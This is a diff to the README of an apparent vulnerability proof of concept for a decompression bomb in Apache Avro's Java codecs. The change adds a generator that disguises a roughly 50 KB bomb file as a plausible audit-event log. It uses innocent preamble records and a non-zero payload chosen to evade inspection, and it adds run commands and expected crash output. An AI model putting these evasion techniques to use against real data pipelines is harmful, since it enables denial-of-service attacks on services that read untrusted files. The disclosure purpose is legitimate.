@@ -3,7 +3,7 @@
 Proof of concept demonstrating a **decompression bomb** vulnerability in
 [Apache Avro](https://github.com/apache/avro)'s Java codec layer.
 
-A crafted Avro file that is **49 KB on disk** decompresses to **50 MB** at
+A crafted Avro file that is **50 KB on disk** decompresses to **50 MB** at
 read time, causing `java.lang.OutOfMemoryError` and crashing the JVM. The
 root cause is that every compression codec in Avro decompresses into an
 **unbounded `ByteArrayOutputStream`** with no size limit.
@@ -17,15 +17,16 @@ root cause is that every compression codec in Avro decompresses into an
 1. [Vulnerability summary](#vulnerability-summary)
 2. [Affected versions and components](#affected-versions-and-components)
 3. [Technical root cause](#technical-root-cause)
-4. [How the PoC works](#how-the-poc-works)
-5. [Quick start -- Docker](#quick-start----docker)
-6. [Quick start -- local Maven](#quick-start----local-maven)
-7. [Expected output](#expected-output)
-8. [Project structure](#project-structure)
-9. [Prerequisites](#prerequisites)
-10. [Impact assessment](#impact-assessment)
-11. [Suggested mitigation](#suggested-mitigation)
-12. [References](#references)
+4. [The crafted `.avro` file](#the-crafted-avro-file)
+5. [How the PoC works](#how-the-poc-works)
+6. [Quick start -- Docker](#quick-start----docker)
+7. [Quick start -- local Maven](#quick-start----local-maven)
+8. [Expected output](#expected-output)
+9. [Project structure](#project-structure)
+10. [Prerequisites](#prerequisites)
+11. [Impact assessment](#impact-assessment)
+12. [Suggested mitigation](#suggested-mitigation)
+13. [References](#references)
 
 ---
 
@@ -89,7 +90,7 @@ public ByteBuffer decompress(ByteBuffer data) throws IOException {
 There is **no upper bound** on how large `baos` can grow. An attacker only
 needs to produce a valid deflate stream whose decompressed output exceeds
 available heap memory. Because zeros compress at roughly 1000:1 with deflate
-level 9, a 49 KB file is enough to produce 50 MB of output, which is
+level 9, a 50 KB file is enough to produce 50 MB of output, which is
 sufficient to crash a JVM running with `-Xmx32m` and will consume
 significant memory on any JVM.
 
@@ -104,26 +105,92 @@ try (InputStream ios = ZstandardLoader.input(bytesIn, useBufferPool)) {
 
 ---
 
+## The crafted `.avro` file
+
+The PoC includes `CraftBomb.java`, which generates a file specifically
+designed to **evade casual inspection** while still triggering the
+vulnerability. This is what makes it a realistic attack vector rather than a
+synthetic test case.
+
+### Anatomy of the crafted file
+
+```
+crafted-bomb.avro (50 KB on disk)
+|
+|-- Header
+|     Schema:    com.example.events.AuditEvent
+|     Codec:     deflate
+|     Fields:    timestamp (long), user_id (string), event_type (enum),
+|                source_ip (string), message (string), attachment (bytes)
+|
+|-- Block 0  (preamble -- small, decompresses safely)
+|     Record #1: alice@example.com   LOGIN     "User authenticated via SSO"
+|     Record #2: bob@corp.internal   UPLOAD    "Uploaded quarterly-report-Q4.pdf"  [15-byte PDF stub]
+|     Record #3: charlie@example.com DOWNLOAD  "Downloaded dataset export-2025-01-14.csv"
+|     Record #4: diana@example.com   DELETE    "Deleted stale cache objects (batch #4091)"
+|     Record #5: eve@partner.co      EXPORT    "Exported compliance report CR-2025-0114"
+|     Record #6: frank@example.com   LOGIN     "User authenticated via LDAP"
+|     Record #7: grace@corp.internal UPLOAD    "Uploaded signed-contract-vendor-A.pdf"   [15-byte PDF stub]
+|     Record #8: heidi@example.com   LOGOUT    "Session expired after 30 min idle timeout"
+|
+|-- Block 1  (bomb -- 50 KB compressed, 50 MB decompressed)
+|     Record #9: svc-data-export@internal  EXPORT
+|                "Bulk export: full database snapshot for DR replication"
+|                attachment = 50 MB of repeating 0xDEADBEEF
+```
+
+### Why this is effective
+
+| Property | Detail |
+| -------- | ------ |
+| **Realistic schema** | Looks like a standard audit/event log. Schema validation passes. |
+| **Innocent preamble** | 8 records with plausible users, IPs, timestamps, and actions. Any `--head N` inspection sees only normal data. |
+| **Plausible bomb record** | The bomb record is an `EXPORT` event from a service account (`svc-data-export@internal`) with a "database snapshot" attachment -- a scenario that legitimately produces large binary payloads. |
+| **Non-zero payload** | The bomb uses repeating `0xDEADBEEF` instead of all-zeros, bypassing naive "check for zero-filled data" heuristics while still achieving ~1005:1 compression. |
+| **Block-separated** | Preamble records are flushed into their own Avro sync block. The bomb occupies a separate block. The reader **must** decompress the bomb block to check for more records (`hasNext()`), so the OOM is unavoidable. |
+| **Tiny on disk** | 50 KB total -- small enough to embed in an email, upload via REST API, or drop into an S3 bucket unnoticed. |
+
+### Metrics
+
+| Metric | Value |
+| ------ | ----- |
+| File size on disk | **52,174 bytes (50 KB)** |
+| Total records | **9** (8 normal + 1 bomb) |
+| Bomb payload (uncompressed) | **50 MB** (52,428,800 bytes) |
+| Bomb pattern | Repeating `0xDEADBEEF` |
+| Compression ratio | **~1005:1** |
+| Heap required to crash | **< 50 MB** (`-Xmx32m` reliably triggers OOM) |
+
+---
+
 ## How the PoC works
 
-The PoC consists of two programs:
+The PoC consists of three programs:
 
-### Step 1 -- `CreatePoC.java`
+### `CraftBomb.java` (recommended)
 
-1. Defines a minimal Avro schema with a single `bytes` field.
-2. Opens a `DataFileWriter` with **deflate level 9** (maximum compression).
-3. Writes a single record containing **50 MB of zeros**.
-4. The resulting `poc.avro` file is ~49 KB on disk (compression ratio ~1026:1).
+1. Defines a realistic `AuditEvent` schema with six fields including a
+   `bytes` attachment.
+2. Writes 8 innocent preamble records with plausible field values.
+3. Flushes a sync block boundary so the preamble sits in its own block.
+4. Writes a 9th record carrying 50 MB of repeating `0xDEADBEEF` in the
+   attachment field, compressed with deflate level 9.
+5. The resulting file is ~50 KB on disk.
 
-### Step 2 -- `TriggerOOM.java`
+### `CreatePoC.java` (minimal variant)
 
-1. Opens the `poc.avro` file with a standard `DataFileReader`.
-2. Calls `reader.hasNext()`, which internally calls `DeflateCodec.decompress()`.
-3. The codec tries to inflate the 49 KB compressed block into 50 MB.
-4. With `-Xmx32m`, the JVM cannot allocate 50 MB and throws
-   `OutOfMemoryError`.
-5. The program catches the `OutOfMemoryError`, prints a confirmation message
-   with the full stack trace, and exits with code **99**.
+1. Defines a minimal schema with a single `bytes` field.
+2. Writes one record containing 50 MB of zeros.
+3. The resulting file is ~49 KB. This is the simplest possible reproduction.
+
+### `TriggerOOM.java`
+
+1. Opens any `.avro` file with a standard `DataFileReader`.
+2. Prints the schema and codec metadata.
+3. Iterates through records, printing a one-line summary of each.
+4. When the bomb block is decompressed, the JVM runs out of memory.
+5. Catches `OutOfMemoryError`, prints a confirmation with the full stack
+   trace, and exits with code **99**.
 
 ---
 
@@ -142,9 +209,10 @@ docker run --rm --memory=512m avro-oom-poc
 
 The container will:
 
-1. Generate `poc.avro` (step 1, runs with `-Xmx256m`)
-2. Attempt to read it (step 2, runs with `-Xmx32m`)
-3. Print `VULNERABILITY CONFIRMED` and exit with code **99**
+1. Generate `crafted-bomb.avro` (step 1, runs with `-Xmx256m`)
+2. Read the first 8 records successfully (step 2, runs with `-Xmx32m`)
+3. Crash with `OutOfMemoryError` on the 9th record's block
+4. Print `VULNERABILITY CONFIRMED` and exit with code **99**
 
 The Dockerfile uses a **multi-stage build**:
 
@@ -170,11 +238,21 @@ Or manually:
 # 1. Build
 mvn package -DskipTests
 
-# 2. Generate the malicious Avro file (needs large heap to hold 50MB in memory)
+# 2. Generate the crafted bomb file (needs large heap to hold 50 MB in memory)
+java -Xmx256m -cp target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar \
+    poc.CraftBomb crafted-bomb.avro
+
+# 3. Trigger OOM (32 MB heap cannot hold 50 MB decompressed block)
+java -Xmx32m -cp target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar \
+    poc.TriggerOOM crafted-bomb.avro
+```
+
+You can also use the minimal variant:
+
+```bash
 java -Xmx256m -cp target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar \
     poc.CreatePoC poc.avro
 
-# 3. Trigger OOM (32 MB heap cannot hold 50 MB decompressed output)
 java -Xmx32m -cp target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar \
     poc.TriggerOOM poc.avro
 ```
@@ -184,23 +262,39 @@ java -Xmx32m -cp target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar \
 ## Expected output
 
 ```
-=== Avro Decompression Bomb PoC - File Generator ===
+=== Avro Decompression Bomb -- Crafted File Generator ===
 
-Creating malicious Avro file: poc.avro
-Payload size (uncompressed): 50 MB
+Output:              crafted-bomb.avro
+Schema:              com.example.events.AuditEvent
+Preamble records:    8
+Bomb payload:        50 MB (repeating 0xDEADBEEF)
 
 Result:
-  File size on disk: 51125 bytes (49 KB)
-  Decompressed size: 50 MB
-  Compression ratio: 1026:1
+  Total records:     9 (8 normal + 1 bomb)
+  File size on disk: 52174 bytes (50 KB)
+  Decompressed bomb: 50 MB
+  Compression ratio: 1005:1
 
 === Avro Decompression Bomb PoC - OOM Trigger ===
 
-Reading file: poc.avro
+Reading file: crafted-bomb.avro
 Max heap:     32 MB
-File size on disk: 51125 bytes (49 KB)
 
-Attempting to read and decompress...
+File size on disk: 52174 bytes (50 KB)
+
+Schema: com.example.events.AuditEvent
+Codec:  deflate
+
+Reading records...
+
+  #1 {timestamp=1736899200000, user_id=alice@example.com, event_type=LOGIN, ...}
+  #2 {timestamp=1736899201500, user_id=bob@corp.internal, event_type=UPLOAD, ...}
+  #3 {timestamp=1736899203000, user_id=charlie@example.com, event_type=DOWNLOAD, ...}
+  #4 {timestamp=1736899210000, user_id=diana@example.com, event_type=DELETE, ...}
+  #5 {timestamp=1736899215000, user_id=eve@partner.co, event_type=EXPORT, ...}
+  #6 {timestamp=1736899220000, user_id=frank@example.com, event_type=LOGIN, ...}
+  #7 {timestamp=1736899225000, user_id=grace@corp.internal, event_type=UPLOAD, ...}
+  #8 {timestamp=1736899230000, user_id=heidi@example.com, event_type=LOGOUT, ...}
 
 *** VULNERABILITY CONFIRMED ***
 
@@ -217,13 +311,6 @@ java.lang.OutOfMemoryError: Java heap space
     at org.apache.avro.file.DataFileStream$DataBlock.decompressUsing(DataFileStream.java:394)
     at org.apache.avro.file.DataFileStream.hasNext(DataFileStream.java:227)
     at poc.TriggerOOM.main(TriggerOOM.java:54)
-
-Root cause: DeflateCodec.decompress() decompresses into an
-unbounded ByteArrayOutputStream with no size limit, allowing
-a small compressed payload to expand until OOM.
-
-CWE-409: Improper Handling of Highly Compressed Data
-Impact: Denial of Service (DoS) - JVM crash via OOM
 ```
 
 Exit code: **99** (vulnerability confirmed).
@@ -241,8 +328,9 @@ avro-oom-compression-poc/
 |   `-- main/
 |       `-- java/
 |           `-- poc/
-|               |-- CreatePoC.java      # Generates the 49 KB bomb file
-|               `-- TriggerOOM.java     # Reads it, triggers OOM
+|               |-- CraftBomb.java      # Generates the realistic 50 KB bomb file
+|               |-- CreatePoC.java      # Generates the minimal 49 KB bomb file
+|               `-- TriggerOOM.java     # Reads any .avro file, triggers OOM
 `-- README.md                           # This file
 ```
 
@@ -251,9 +339,10 @@ avro-oom-compression-poc/
 | File | Purpose |
 | ---- | ------- |
 | `pom.xml` | Maven build with `maven-shade-plugin` to produce a single uber-jar containing Avro 1.12.0 and all transitive dependencies (Jackson, Commons Compress, etc.). Targets Java 11. |
-| `CreatePoC.java` | Writes a valid Avro data file with a single record containing 50 MB of zeros, compressed with deflate level 9. The result is ~49 KB. |
-| `TriggerOOM.java` | Opens the file with `DataFileReader` and iterates. Catches `OutOfMemoryError` explicitly, prints the stack trace, and exits with code 99. |
-| `run-poc.sh` | Shell script that builds (if needed), generates `poc.avro`, and runs the trigger with `-Xmx32m`. Interprets exit codes. |
+| `CraftBomb.java` | Generates a realistic audit-event `.avro` file with 8 innocent preamble records and a 9th record carrying a 50 MB `0xDEADBEEF` bomb in the `attachment` field. Preamble and bomb are in separate Avro sync blocks. |
+| `CreatePoC.java` | Minimal variant: writes one record with 50 MB of zeros in a single `bytes` field. Simpler but obviously synthetic. |
+| `TriggerOOM.java` | Opens any `.avro` file with `DataFileReader`, prints schema/codec metadata and a one-line summary per record, then crashes with OOM on the bomb block. Exits with code 99 on success. |
+| `run-poc.sh` | Shell script that builds (if needed), generates `crafted-bomb.avro`, and runs the trigger with `-Xmx32m`. Interprets exit codes. |
 | `Dockerfile` | Two-stage build: stage 1 compiles with Maven, stage 2 copies the jar into an Alpine JRE image and runs both steps via an embedded entrypoint script. |
 
 ---
@@ -280,7 +369,7 @@ avro-oom-compression-poc/
 | **Integrity** | None -- no data is modified. |
 | **Availability** | **High** -- the JVM crashes with `OutOfMemoryError`, terminating the process. In a shared environment, this can affect co-located services. |
 | **Attack complexity** | **Low** -- the attacker only needs to supply a valid `.avro` file. No authentication or special privileges are required. |
-| **Exploitability** | **Trivial** -- the bomb file is 49 KB and can be generated with standard Avro APIs. No binary manipulation is needed. |
+| **Exploitability** | **Trivial** -- the bomb file is 50 KB and can be generated with standard Avro APIs. No binary manipulation is needed. |
 | **Blast radius** | Any Java application that reads untrusted Avro files: data pipelines, REST APIs, CLI tools (`avro-tools`), streaming consumers. |
 
 ### Real-world attack scenarios
@@ -293,8 +382,12 @@ avro-oom-compression-poc/
    Registry, Confluent REST Proxy) can be crashed by posting a small request
    body.
 
-3. **CLI tool crash**: Running `avro-tools tojson poc.avro` crashes
+3. **CLI tool crash**: Running `avro-tools tojson crafted-bomb.avro` crashes
    immediately, which is a problem for CI/CD validation steps or admin scripts.
+
+4. **Supply chain**: A compromised upstream data producer writes bomb records
+   into a shared Avro topic. All downstream consumers crash when they reach
+   the poisoned offset.
 
 ---
 
